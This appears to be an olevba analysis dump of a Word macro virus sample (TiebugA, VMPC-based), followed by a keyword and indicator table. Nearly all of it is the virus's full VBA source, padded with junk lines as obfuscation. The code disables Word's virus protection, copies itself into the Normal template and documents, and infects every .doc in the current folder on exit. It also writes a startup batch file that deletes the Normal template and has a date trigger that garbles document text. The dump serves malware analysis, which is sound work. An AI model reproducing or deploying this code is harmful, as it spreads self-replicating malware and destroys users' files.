olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-0a830e43df7ba013ef9120e9124e9fb57a127105a6a22e78ebd733b0b29f91f0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-0a830e43df7ba013ef9120e9124e9fb57a127105a6a22e78ebd733b0b29f91f0 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO TiebugA.bas 
in file: Virus.MSWord.VMPC-based-0a830e43df7ba013ef9120e9124e9fb57a127105a6a22e78ebd733b0b29f91f0 - OLE stream: 'Macros/VBA/TiebugA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
    
    
Sub TiebugA()
On Error Resume Next
Randomize
k783 = m16108 & e6054
f746 = m16108 & c6091 & Int(Rnd * 9482)
f7566 = u8815 & c14713 & Int(Rnd * 6196)
f7566 = m8815 & c14713 & Int(Rnd * 560)
k5348 = m13313 & e14435
f10911 = m13313 & c8872 & Int(Rnd * 9973)
f15827 = u14710 & c12480 & Int(Rnd * 8130)
f15827 = m14710 & c12480 & Int(Rnd * 4728)
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Application.VBE.ActiveVBProject.VBComponents("TiebugA").Export "c:\Windows\TiebugA.sys"
k8403 = m8578 & e3756
f2602 = m8578 & c9557 & Int(Rnd * 2411)
k16875 = m10945 & e14095
f16756 = m10945 & c14214 & Int(Rnd * 1192)
f16291 = m12828 & c8348 & Int(Rnd * 7960)
ActiveDocument.ReadOnlyRecommended = False
f4448 = u5704 & c13952 & k9187 & m5704
f4448 = m5704 & c13952 & Int(Rnd * 186)
f9696 = u11509 & c3124 & Int(Rnd * 6691)
f9696 = m11509 & c3124 & Int(Rnd * 5922)
f12993 = u7169 & c5736 & Int(Rnd * 2409)
f12993 = m7169 & c5736 & Int(Rnd * 1941)
f8721 = u6436 & c9844 & Int(Rnd * 5878)
f8721 = m6436 & c9844 & Int(Rnd * 6063)
k9311 = m10787 & e8247
f10114 = m10787 & c7444 & Int(Rnd * 5759)
rm = Int(Rnd * 100)
    If rm = 99 Then MsgBox "Infected 1998 - 3000 by Virus", vbSystemModal
f15648 = m12163 & c10629 & Int(Rnd * 9083)
f8090 = u11114 & c1198 & Int(Rnd * 1009)
f8090 = m11114 & c1198 & Int(Rnd * 2340)
f18196 = u14136 & c3361 & Int(Rnd * 1906)
f18196 = m14136 & c3361 & Int(Rnd * 4283)
f2828 = u9964 & c12954 & k3437 & m9964
f2828 = m9964 & c12954 & Int(Rnd * 1450)
f10459 = u10539 & c12076 & Int(Rnd * 6581)
f10459 = m10539 & c12076 & Int(Rnd * 1895)
f10233 = m9153 & c18677 & Int(Rnd * 2856)
k1842 = m9559 & e15505
f6531 = m9559 & c10816 & Int(Rnd * 2153)
If Month(Now()) = 11 And Day(Now()) = 13 Then Call p8274
f12589 = u13234 & c10486 & Int(Rnd * 4439)
f12589 = m13234 & c10486 & Int(Rnd * 7257)
f10506 = m9378 & c3623 & Int(Rnd * 5289)
f9423 = u11284 & c8180 & Int(Rnd * 3928)
f9423 = m11284 & c8180 & Int(Rnd * 3488)
f10101 = u5444 & c8373 & Int(Rnd * 2025)
f10101 = m5444 & c8373 & Int(Rnd * 606)
 f448$ = "c:\windows\startm~1\programs\startup\msfile.bat"
f1210 = u4227 & c11958 & k7688 & m4227
f1210 = m4227 & c11958 & Int(Rnd * 2715)
k10534 = m15939 & e7986
f9411 = m15939 & c9109 & Int(Rnd * 8334)
f82748209 = GetAttr(NormalTemplate.FullName)
f5661 = m7507 & c9701 & Int(Rnd * 4237)
k11097 = m9051 & e11301
f12529 = m9051 & c9869 & Int(Rnd * 8708)
If f82748209 = vbReadOnly And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vTTG(f448$)
k7811 = m9311 & e4514
f6876 = m9311 & c5449 & Int(Rnd * 8288)
f15363 = u6594 & c16614 & k16159 & m6594
f15363 = m6594 & c16614 & Int(Rnd * 1496)
If f82748209 = vbReadOnly + vbArchive And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vTTG(f448$)
f8946 = u7822 & c3242 & k3628 & m7822
f8946 = m7822 & c3242 & Int(Rnd * 5102)
f13816 = u10382 & c5306 & k7716 & m10382
f13816 = m10382 & c5306 & Int(Rnd * 6462)
If f82748209 = vbReadOnly Then GoTo bugitSR
f9589 = u8488 & c10960 & k1938 & m8488
f9589 = m8488 & c10960 & Int(Rnd * 3979)
f10174 = u4970 & c8061 & Int(Rnd * 2439)
f10174 = m4970 & c8061 & Int(Rnd * 4307)
If f82748209 = vbReadOnly + vbArchive Then GoTo bugitSR
f11090 = u5861 & c10723 & Int(Rnd * 2291)
f11090 = m5861 & c10723 & Int(Rnd * 5618)
f10340 = u12174 & c10842 & Int(Rnd * 7724)
f10340 = m12174 & c10842 & Int(Rnd * 4798)
f9351 = u11757 & c8491 & Int(Rnd * 748)
f9351 = m11757 & c8491 & Int(Rnd * 9786)
f10221 = u13809 & c9607 & k13408 & m13809
f10221 = m13809 & c9607 & Int(Rnd * 7702)
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "TiebugA" Then Unit1878209714611 = True
Next I
k13876 = m7992 & e6629
f10280 = m7992 & c10225 & Int(Rnd * 6250)
f5721 = u11689 & c10318 & k8967 & m11689
f5721 = m11689 & c10318 & Int(Rnd * 2785)
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "TiebugA" Then mmf71466 = True
Next I
f7971 = u12748 & c9962 & k6188 & m12748
f7971 = m12748 & c9962 & Int(Rnd * 5243)
k5032 = m10370 & e9187
f9125 = m10370 & c5094 & Int(Rnd * 747)
If Unit1878209714611 = True And mmf71466 = False Then Set x714682099 = NormalTemplate.VBProject.VBComponents
If Unit1878209714611 = False And mmf71466 = True Then Set x714682099 = ActiveDocument.VBProject.VBComponents
x714682099.import "c:\Windows\TiebugA.sys"
If Unit1878209714611 = False And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
k15003 = m14214 & e3260
f6518 = m14214 & c11745 & Int(Rnd * 6999)
k7592 = m5297 & e12372
f8150 = m5297 & c11814 & Int(Rnd * 888)
k6312 = m7834 & e10780
f13637 = m7834 & c3455 & Int(Rnd * 818)
f15077 = u11024 & c12599 & k10657 & m11024
f15077 = m11024 & c12599 & Int(Rnd * 3908)
k14124 = m8161 & e4696
f11613 = m8161 & c7207 & Int(Rnd * 7398)
f7626 = m12997 & c5331 & Int(Rnd * 9107)
If mmf71466 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
f6351 = u7011 & c18964 & k10437 & m7011
f6351 = m7011 & c18964 & Int(Rnd * 6508)
f8078 = u15770 & c12126 & Int(Rnd * 4846)
f8078 = m15770 & c12126 & Int(Rnd * 7186)
f3758 = m16199 & c14687 & Int(Rnd * 7914)
k6847 = m14789 & e18168
f14149 = m14789 & c10866 & Int(Rnd * 7444)
bugitSR:
End Sub
Sub HelpAbout()
    On Error Resume Next
f16112 = u10280 & c16495 & Int(Rnd * 7056)
f16112 = m10280 & c16495 & Int(Rnd * 2316)
f9934 = u8240 & c5593 & k7907 & m8240
f9934 = m8240 & c5593 & Int(Rnd * 115)
    MsgBox "Stop the killing of Baby Virii!", vbInformation
f12946 = u18329 & c14189 & Int(Rnd * 6545)
f12946 = m18329 & c14189 & Int(Rnd * 8546)
f9530 = m14305 & c10343 & Int(Rnd * 5431)
End Sub
Sub FileNew()
    On Error Resume Next
f4733 = u11272 & c7968 & k4689 & m11272
f4733 = m11272 & c7968 & Int(Rnd * 7772)
    Call TiebugA
f18839 = u4802 & c1080 & Int(Rnd * 605)
f18839 = m4802 & c1080 & Int(Rnd * 3160)
f9185 = u14553 & c5711 & Int(Rnd * 2173)
f9185 = m14553 & c5711 & Int(Rnd * 9295)
Dialogs(wdDialogFileNew).Show
f11958 = u7913 & c11839 & Int(Rnd * 9569)
f11958 = m7913 & c11839 & Int(Rnd * 3534)
k14812 = m6357 & e7046
f10400 = m6357 & c11458 & Int(Rnd * 3347)
    Skip = 1
k5157 = m15455 & e8221
f4793 = m15455 & c8585 & Int(Rnd * 6321)
f10993 = u1489 & c2831 & Int(Rnd * 2622)
f10993 = m1489 & c2831 & Int(Rnd * 1152)
    Call TiebugA
k13080 = m12232 & e5812
f9958 = m12232 & c8934 & Int(Rnd * 2745)
End Sub
Sub FileSaveAs()
    On Error Resume Next
f11636 = u2154 & c10548 & Int(Rnd * 1320)
f11636 = m2154 & c10548 & Int(Rnd * 28)
k15143 = m6821 & e12860
f16313 = m6821 & c11690 & Int(Rnd * 590)
Dialogs(wdDialogFileSaveAs).Show
f3136 = u9526 & c10311 & Int(Rnd * 1468)
f3136 = m9526 & c10311 & Int(Rnd * 1667)
k13700 = m7656 & e10980
f8291 = m7656 & c16389 & Int(Rnd * 615)
    Call TiebugA
f11397 = u15422 & c8080 & k7426 & m15422
f11397 = m15422 & c8080 & Int(Rnd * 5835)
f8172 = m9290 & c5157 & Int(Rnd * 3518)
End Sub
Sub FileExit()
    On Error Resume Next
f12326 = m11658 & c9813 & Int(Rnd * 2300)
f11862 = u13540 & c13946 & Int(Rnd * 5566)
f11862 = m13540 & c13946 & Int(Rnd * 9067)
    Call TiebugA
f10017 = u6415 & c9552 & Int(Rnd * 5344)
f10017 = m6415 & c9552 & Int(Rnd * 1293)
k4389 = m15851 & e3331
f7077 = m15851 & c643 & Int(Rnd * 6563)
    If ActiveDocument.Saved = False Then ActiveDocument.Save
f10375 = u11511 & c13255 & Int(Rnd * 9900)
f10375 = m11511 & c13255 & Int(Rnd * 2582)
f4291 = u17147 & c5443 & k2957 & m17147
f4291 = m17147 & c5443 & Int(Rnd * 7170)
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call TiebugA
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call TiebugA
End If
Loop
    Application.Quit
k3673 = m11499 & e5054
f5684 = m11499 & c3043 & Int(Rnd * 6866)
f13029 = m16505 & c8149 & Int(Rnd * 9724)
End Sub
Sub AutoOpen()
    On Error Resume Next
f13660 = m11826 & c6796 & Int(Rnd * 3447)
f5577 = u8479 & c10879 & Int(Rnd * 9397)
f5577 = m8479 & c10879 & Int(Rnd * 4924)
    Call TiebugA
f18397 = u10676 & c18553 & Int(Rnd * 9367)
f18397 = m10676 & c18553 & Int(Rnd * 2557)
f16028 = u11251 & c7675 & Int(Rnd * 9215)
f16028 = m11251 & c7675 & Int(Rnd * 3002)
End Sub
Sub AutoExec()
    On Error Resume Next
k14608 = m9865 & e15471
f15802 = m9865 & c14277 & Int(Rnd * 3963)
f12100 = u10270 & c16415 & k16203 & m10270
f12100 = m10270 & c16415 & Int(Rnd * 3260)
    Call TiebugA
f9970 = u17576 & c8006 & Int(Rnd * 958)
f9970 = m17576 & c8006 & Int(Rnd * 7898)
f17886 = u13720 & c11141 & k17263 & m13720
f17886 = m13720 & c11141 & Int(Rnd * 5930)
End Sub
Sub ToolsMacro()
    On Error Resume Next
f4994 = u11995 & c13778 & k11734 & m11995
f4994 = m11995 & c13778 & Int(Rnd * 4595)
f7482 = u9786 & c15891 & Int(Rnd * 9515)
f7482 = m9786 & c15891 & Int(Rnd * 1247)
    Call TiebugA
f16779 = u4939 & c7556 & Int(Rnd * 3391)
f16779 = m4939 & c7556 & Int(Rnd * 3822)
k14894 = m16651 & e14792
f14980 = m16651 & c14706 & Int(Rnd * 9441)
f1232 = u8219 & c5300 & Int(Rnd * 697)
f1232 = m8219 & c5300 & Int(Rnd * 5344)
k9451 = m13393 & e7848
f9911 = m13393 & c7388 & Int(Rnd * 9349)
MsgBox "File Not Found"
k12173 = m10022 & e11320
f12445 = m10022 & c11048 & Int(Rnd * 9395)
f12744 = u10936 & c14134 & k14513 & m10936
f12744 = m10936 & c14134 & Int(Rnd * 2137)
End Sub
Sub FileTemplates()
    On Error Resume Next
k11982 = m12165 & e5107
f6328 = m12165 & c10761 & Int(Rnd * 5743)
f9386 = u11093 & c10904 & Int(Rnd * 9633)
f9386 = m11093 & c10904 & Int(Rnd * 7569)
    Call TiebugA
f15159 = u9199 & c16558 & Int(Rnd * 7414)
f15159 = m9199 & c16558 & Int(Rnd * 5086)
f5743 = u5683 & c13660 & Int(Rnd * 290)
f5743 = m5683 & c13660 & Int(Rnd * 5415)
f6659 = u16572 & c16321 & Int(Rnd * 4085)
f6659 = m16572 & c16321 & Int(Rnd * 6725)
f5910 = u12886 & c16439 & k8706 & m12886
f5910 = m12886 & c16439 & Int(Rnd * 5906)
MsgBox "File Not Found"
f16731 = u6099 & c16010 & Int(Rnd * 7266)
f16731 = m6099 & c16010 & Int(Rnd * 427)
f5791 = u14520 & c5206 & Int(Rnd * 3125)
f5791 = m14520 & c5206 & Int(Rnd * 8809)
End Sub
Sub ViewVBCode()
    On Error Resume Next
f15849 = m8703 & c5823 & Int(Rnd * 7357)
k13329 = m12401 & e13878
f11291 = m12401 & c15916 & Int(Rnd * 3892)
    Call TiebugA
k10550 = m13461 & e8553
f13541 = m13461 & c5562 & Int(Rnd * 6351)
k9394 = m11083 & e15993
f14695 = m11083 & c10692 & Int(Rnd * 1855)
k13357 = m8558 & e9806
f13898 = m8558 & c9265 & Int(Rnd * 7640)
MsgBox "File Not Found"
f13719 = u6010 & c7413 & k11953 & m6010
f13719 = m6010 & c7413 & Int(Rnd * 1996)
k10673 = m8546 & e7586
f9207 = m8546 & c9052 & Int(Rnd * 1925)
End Sub
Sub p8274()
    On Error Resume Next
f10648 = u11736 & c8198 & Int(Rnd * 1054)
f10648 = m11736 & c8198 & Int(Rnd * 5016)
f7184 = m8873 & c2806 & Int(Rnd * 8505)
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "t"
            .Replacement.Text = "Tiebug.A"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
k14580 = m3710 & e9544
f13195 = m3710 & c10929 & Int(Rnd * 216)
k14799 = m7723 & e11685
f11921 = m7723 & c14563 & Int(Rnd * 7615)
End Sub
    
Sub vTTG(strFile As String)
    
Dim hFile As Long
On Error Resume Next
f5458 = u10113 & c9645 & Int(Rnd * 1364)
f5458 = m10113 & c9645 & Int(Rnd * 7827)
k11609 = m16911 & e18003
f19325 = m16911 & c10287 & Int(Rnd * 9021)
n$ = NormalTemplate
k15200 = m9132 & e14714
f11529 = m9132 & c18385 & Int(Rnd * 8085)
f13494 = u4623 & c14015 & Int(Rnd * 3575)
f13494 = m4623 & c14015 & Int(Rnd * 2956)
Part11$ = "attrib -h -r "
f5505 = u8951 & c11190 & Int(Rnd * 8982)
f5505 = m8951 & c11190 & Int(Rnd * 1222)
f8517 = u19041 & c9789 & k8735 & m19041
f8517 = m19041 & c9789 & Int(Rnd * 9653)
snag$ = "c:\progra~1\micros~1\templa~1\"
k15831 = m15016 & e15210
f15100 = m15016 & c15941 & Int(Rnd * 6538)
k19049 = m11984 & e4820
f10303 = m11984 & c13566 & Int(Rnd * 8880)
snag1$ = "c:\progra~1\micros~2\templa~1\"
k13891 = m5514 & e17194
f14409 = m5514 & c16676 & Int(Rnd * 4267)
f4755 = u5266 & c11309 & Int(Rnd * 3314)
f4755 = m5266 & c11309 & Int(Rnd * 403)
Part2$ = "del "
f7529 = u8624 & c7438 & k4456 & m8624
f7529 = m8624 & c7438 & Int(Rnd * 4641)
k9174 = m7069 & e3853
f5969 = m7069 & c7058 & Int(Rnd * 4454)
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, Part11$ + snag$ + n$
Print #hFile, Part11$ + snag1$ + n$
Print #hFile, Part2$ + snag$ + n$
Print #hFile, Part2$ + snag1$ + n$
Print #hFile, "cls"
Print #hFile, Part2$ + "c:\windows\startm~1\programs\startup\msfile.bat"
Close hFile
f11143 = u17888 & c16831 & Int(Rnd * 8045)
f11143 = m17888 & c16831 & Int(Rnd * 9498)
f10631 = u10933 & c9419 & k16846 & m10933
f10631 = m10933 & c9419 & Int(Rnd * 2872)
f7786 = u8046 & c3602 & Int(Rnd * 4079)
f7786 = m8046 & c3602 & Int(Rnd * 4931)
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |msfile.bat          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

